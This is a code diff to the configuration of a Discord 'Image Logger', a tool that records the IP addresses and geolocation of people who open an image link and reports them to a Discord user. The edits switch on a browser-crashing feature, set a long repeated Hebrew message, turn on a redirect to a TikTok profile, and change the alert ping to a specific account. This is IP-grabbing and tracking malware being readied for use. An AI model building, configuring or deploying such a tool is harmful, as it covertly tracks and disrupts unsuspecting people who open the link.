@@ -22,8 +22,8 @@ config = {
 
     # OPTIONS #
     "crashBrowser": {
-        "doCrashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-        "customMessage": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "doCrashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+        "customMessage": "עברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את זעברנו את פרעה נעבור גם את ז",
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -44,8 +44,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.tiktok.com/@real_stenn" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -72,7 +72,7 @@ def makeReport(ip, useragent = None):
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@.staff#3838"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
